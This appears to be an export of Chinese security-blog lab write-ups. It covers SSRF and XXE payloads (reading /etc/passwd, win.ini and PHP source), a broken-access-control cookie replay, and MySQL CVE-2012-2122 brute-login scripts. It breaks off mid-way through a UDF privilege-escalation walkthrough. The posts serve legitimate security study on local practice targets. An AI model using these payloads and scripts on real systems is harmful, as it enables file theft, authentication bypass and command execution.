<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>探测内网其他主机的端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100:22</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE ：xml external entity injection，xml外部实体注入漏洞<br>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,即<strong>服务端接收和解析了来自用户端的xml数据</strong>,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>目前多种语言解析xml的函数默认禁止解析外部实体内容的,从而直接避免这个漏洞。</p>
<p>第一部分：XML声明部分</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二部分：文档类型定义 DTD</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三部分：文档元素</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
<p>① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]></p>
<p>② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></p>
<p>③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></p>
<ul>
<li>本地实体类型举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;  encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [           &#x2F;&#x2F;定义了foo的根元素</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;        &#x2F;&#x2F;foo是接受任何参数的</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;    &#x2F;&#x2F;定义了一个实体 xxe，内容为test</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &#x2F;&#x2F;&amp;xxe进行引用 本地引用</span><br><span class="line">	&lt;pass&gt;pass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>外部实体引用举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>

<p>查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">    <span class="comment">//$xml = $test;</span></span><br><span class="line">    <span class="comment">//考虑到目前很多版本里Libxml都&gt;=2.9.0,所以此处添加LIBXML_NOENT参数开启外部实体解析</span></span><br><span class="line">    <span class="variable">$data</span> = @simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//正常xml数据测试,此处的回显并不能证明支持外部实体，需要进一步测试</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;swanQ&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//服务器为windows系统，用此payload来测试是否有xxe漏洞。</span><br><span class="line">//查看服务器的内容</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C://Windows//win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//用php://filter获取php源代码</span><br><span class="line">//使用php伪协议，打印base64编码后的xxe.php</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//爆破开放端口</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">noet</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//Linux下读取文件</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常xml数据测试:</p>
<p><img src="8.png"></p>
<p>查看服务器的内容:</p>
<p><img src="9.png"></p>
<p>使用php伪协议，打印base64编码后的xxe.php.解码即可看到相应内容。</p>
<p><img src="10.png"></p>
<p><img src="11.png"></p>
<blockquote>
<p>php伪协议：</p>
<p>PHP 带有很多内置 URL 风格的封装协议，支持 <code>scheme://...</code> 的语法</p>
<ul>
<li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
<li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
<li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
<li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
<li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
<li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
<li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
<li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
<li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
<li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
<li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
<li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
</ul>
<p>官方文档：<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
</blockquote>
<p>爆破开放端口时，并无多余提示，但是处理速度不同，解析81端口时，速度明显慢于80端口。</p>
<p>看请求包和回应包的时间间隔来判断是否开放：</p>
<p><img src="12.png"></p>
<p><img src="15.jpg"></p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。<br>从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>一般会从以下方面来防止SQL注入漏洞：</p>
<ol>
<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
<li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需慎重</li>
</ol>
<h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>数字型注入，直接在包后面加上真命题，返回所有的数据库数据</p>
<p><img src="14.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1></script></li></ul>]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>CSRF</tag>
        <tag>SSRF</tag>
        <tag>sql injection</tag>
        <tag>Brute Force</tag>
        <tag>file uploads</tag>
        <tag>over permission</tag>
      </tags>
  </entry>
  <entry>
    <title>越权访问BAC-Broken Access Contro</title>
    <url>/2021/04/22/Broken-Access-Contro/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文将谈谈越权那些事儿。靶场也是本博客的传统–pikachu。</p>
<h1 id="0x02-谈谈越权"><a href="#0x02-谈谈越权" class="headerlink" title="0x02 谈谈越权"></a>0x02 谈谈越权</h1><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。</p>
<p>攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果<strong>验证权限不足</strong>，便会导致越权</p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><p>主要分为水平越权和垂直越权</p>
<p><img src="/2021/04/22/Broken-Access-Contro/6.jpg"></p>
<h3 id="case1-隐藏-URL"><a href="#case1-隐藏-URL" class="headerlink" title="case1: 隐藏 URL"></a>case1: 隐藏 URL</h3><p>有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
<p>解决:验证用户身份，验证用户是否具备操作数据的权限</p>
<h3 id="case2-直接对象引用"><a href="#case2-直接对象引用" class="headerlink" title="case2: 直接对象引用"></a>case2: 直接对象引用</h3><p>通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
<p>解决:直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
<h3 id="case3-多阶段功能"><a href="#case3-多阶段功能" class="headerlink" title="case3: 多阶段功能"></a>case3: 多阶段功能</h3><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
<p>解决:执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限,特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
<h3 id="case4-静态文件"><a href="#case4-静态文件" class="headerlink" title="case4: 静态文件"></a>case4: 静态文件</h3><p>网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
<p>解决:加密静态文件命名规则，防止攻击者枚举;敏感数据特殊化处理</p>
<h3 id="case5-平台配置错误"><a href="#case5-平台配置错误" class="headerlink" title="case5: 平台配置错误"></a>case5: 平台配置错误</h3><p>程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
<p>解决:配置控件上点心儿吧</p>
<h2 id="如何防止："><a href="#如何防止：" class="headerlink" title="如何防止："></a>如何防止：</h2><p>在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
<h2 id="靶场练习："><a href="#靶场练习：" class="headerlink" title="靶场练习："></a>靶场练习：</h2><p>当我们以lucy身份登陆进系统时，可以看到username参数可控，当我们改成其他用户时，可以看到其他用户的个人信息。这属于水平越权。</p>
<p><img src="/2021/04/22/Broken-Access-Contro/1.jpg"></p>
<p><img src="/2021/04/22/Broken-Access-Contro/2.jpg"></p>
<p>接下来看看垂直越权,由于后台处理数据的逻辑存在漏洞,对于发送的数据包并没有判断当前数据包的用户权限,所以存在越权漏洞,具体看代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$link</span>=connect();</span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span></span><br><span class="line"><span class="keyword">if</span>(!check_op2_login(<span class="variable">$link</span>))&#123;</span><br><span class="line">    header(<span class="string">&quot;location:op2_login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;<span class="comment">//用户名密码必填</span></span><br><span class="line">        <span class="variable">$getdata</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>);<span class="comment">//转义</span></span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;<span class="comment">//判断是否插入</span></span><br><span class="line">            header(<span class="string">&quot;location:op2_admin.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先登录admin账户创建test1用户,此时抓包.并发送到repeater模块</p>
<p>然后登陆普通用户pikachu,获取普通用户的cookie.</p>
<p>用此cookie覆盖之前admin用户的cookie,重放数据包,发现用户swanQ成功创建.</p>
<p><img src="/2021/04/22/Broken-Access-Contro/3.jpg"></p>
<p><img src="/2021/04/22/Broken-Access-Contro/4.jpg"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这句话很有道理：</p>
<p>水平越权相当于用别人的卡，而垂直越权相当于用低价购买奢侈品。</p>
]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL提权总结</title>
    <url>/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="0x01-MYSQL漏洞案例："><a href="#0x01-MYSQL漏洞案例：" class="headerlink" title="0x01 MYSQL漏洞案例："></a>0x01 MYSQL漏洞案例：</h1><p>先通过MYSQL身份认证绕过漏洞 CVE-2012-2122开始看起。</p>
<h2 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1. 漏洞原理："></a>1. 漏洞原理：</h2><p>该漏洞是身份认证绕过漏洞，当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于处理不正确，会导致memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。即只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
<h2 id="2-影响版本："><a href="#2-影响版本：" class="headerlink" title="2. 影响版本："></a>2. 影响版本：</h2><p>Mariadb、Mysql：几乎影响5.1至5.5的所有版本，包括5.1.61，5.0.11，5.3.5，5.5.22，5.5.23</p>
<h2 id="3-漏洞复现："><a href="#3-漏洞复现：" class="headerlink" title="3. 漏洞复现："></a>3. 漏洞复现：</h2><p>靶机：Ubuntu 192.168.127.131</p>
<p>攻击机：kali 192.168.127.130</p>
<p>环境：docker  vulhub</p>
<blockquote>
<p>注：</p>
<p>[1]除了安装docker-ce docker-io之外，可能需要安装docker-compose</p>
<p>[2]docker-compose是docker的命令行工具，docker-compose up启动并运行vulhub中的mysql服务。</p>
<p>[3]进入docker：docker exec -it 69d1 bash</p>
</blockquote>
<p> <img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/1.png" alt="img"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2.png" alt="img"></p>
<p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过Mysql客户端可直接登录，其root密码是123456。至此靶机环境搭建完成</p>
<p>攻击机扫描靶机所开放服务：</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/3.png" alt="img"></p>
<p>可看到linux服务器开启了mysql，版本为5.5.23</p>
<h3 id="方法一、用msf直接跑："><a href="#方法一、用msf直接跑：" class="headerlink" title="方法一、用msf直接跑："></a>方法一、用msf直接跑：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">set RHOSTS 192.168.127.131</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/4.png" alt="img"></p>
<p>可以看到密码的哈希值，一般密码以MD5的格式</p>
<blockquote>
<p>注：</p>
<p>[1] MD5加密结果是128位二进制，也就是32位十六进制数</p>
<p>[2] SHA-1加密结果是160位二进制，也就是40位十六进制数</p>
<p>[3] SHA-256加密结果是256位二进制，也就是64位十六进制数</p>
<p>[4] SHA-512加密结果是512位二进制，也就是128位十六进制数</p>
<p>[5] RIPEMD160加密结果是160位二进制，也就是40位十六进制数</p>
</blockquote>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/5.png" alt="img"></p>
<p>MD5解密</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/6.png" alt="img"></p>
<h3 id="方法二、利用bash脚本自动登陆mysql数据库"><a href="#方法二、利用bash脚本自动登陆mysql数据库" class="headerlink" title="方法二、利用bash脚本自动登陆mysql数据库"></a>方法二、利用bash脚本自动登陆mysql数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 用一个错误的密码登录1000次目标主机的mysql数据库</span></span><br><span class="line">for ((i = 1; i &lt; 1000; i++)) </span><br><span class="line">do</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">        mysql -h 192.168.127.131 -u root -p111111 -P 3306;</span><br><span class="line">        echo &quot;= = = = = = = = = = = = = = = = = = = = = = = = = = = = =&quot;;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.jpg" alt="img"></p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/8.jpg" alt="img"></p>
<h3 id="方法三、Python脚本："><a href="#方法三、Python脚本：" class="headerlink" title="方法三、Python脚本："></a>方法三、Python脚本：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">subprocess.Popen(<span class="string">&quot;mysql -u root -P 3306 -h 192.168.127.131 --password=aaaaa&quot;</span>, shell=<span class="literal">True</span>).wait()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/9.jpg" alt="img"></p>
<p>todo:看看mysql 5.5.23的paswword.c出问题的具体位置。</p>
<h1 id="0x02-UDF-提权"><a href="#0x02-UDF-提权" class="headerlink" title="0x02 UDF 提权"></a>0x02 UDF 提权</h1><p>UDF（user defined function）用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充。</p>
<p>通过添加UDF导出dll，再mysql中使用UDF以高权限账号执行命令，添加账号进行提权</p>
<h2 id="1-提权条件："><a href="#1-提权条件：" class="headerlink" title="1.提权条件："></a>1.提权条件：</h2><ul>
<li>知道mysql数据库的账户，有对mysql的insert和delete权限，以创建和抛弃函数。</li>
<li>有可以将动态链接库udf.dll写入相应目录的权限。</li>
</ul>
<h2 id="2-相关知识点"><a href="#2-相关知识点" class="headerlink" title="2.相关知识点"></a>2.相关知识点</h2><h3 id="1-Secure-file-priv参数"><a href="#1-Secure-file-priv参数" class="headerlink" title="1. Secure_file_priv参数"></a>1. Secure_file_priv参数</h3><p>secure-file-priv参数是用来限制LOAD DATA,SELEC,OUTFILE, LOAD_FILE()传递的指定目录</p>
<ul>
<li>值为null ：限制mysql不允许导入导出</li>
<li>值为/tmp/ ：限制mysql的导入导出只能发生在/tmp/目录</li>
<li>没有具体值：对mysql的导入导出不做限制</li>
</ul>
<p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p>
<h3 id="2-UDF来源"><a href="#2-UDF来源" class="headerlink" title="2.UDF来源"></a>2.UDF来源</h3><p>sqlmap和metasploit中有windows和Linux32和64位的UDF文件，需要先用sqlmap自带解码工具cloak.py对进行异或的UDF文件进行解码:</p>
<p><img src="/2021/04/15/MYSQL%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">路径：</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;63&#x2F;lib_mysqludf_sys.dll_</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;extra&#x2F;cloak&#x2F;cloak.py</span><br></pre></td></tr></table></figure>

<p>metasploit的UDF动态链接库文件无需解码，路径如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">usr/share/metasploit-framework/embedded/framework/data/exploits/mysql</span><br></pre></td></tr></table></figure>

<h3 id="3-UDF提供的函数"><a href="#3-UDF提供的函数" class="headerlink" title="3.UDF提供的函数"></a>3.UDF提供的函数</h3><p>hexdump -C lib_mysqludf_sys_64.so | tail -n +118 | head -n 35</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sys_eval，执行任意命令，并将输出返回。</span><br><span class="line">sys_exec，执行任意命令，并将退出码返回。</span><br><span class="line">sys_get，获取一个环境变量。</span><br><span class="line">sys_set，创建或修改一个环境变量。</span><br></pre></td></tr></table></figure>

<p>此时已经有了udf文件，接下来就要上传到网站的指定目录</p>
<ul>
<li>当mysql &lt; 5.0，导出路径随意。</li>
<li>当5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</li>
<li>当mysql &gt; 5.1，要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数</li>
</ul>
<p>接下来就是寻找插件目录并写入动态链接库：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--查询软件安装目录</span></span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sys_eval是函数名称，udf.dll是lib_mysqludf_sys.dll_上传后的文件名</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">--查看 mysql 函数里是否新增sys_eval</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行系统命令试试</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span 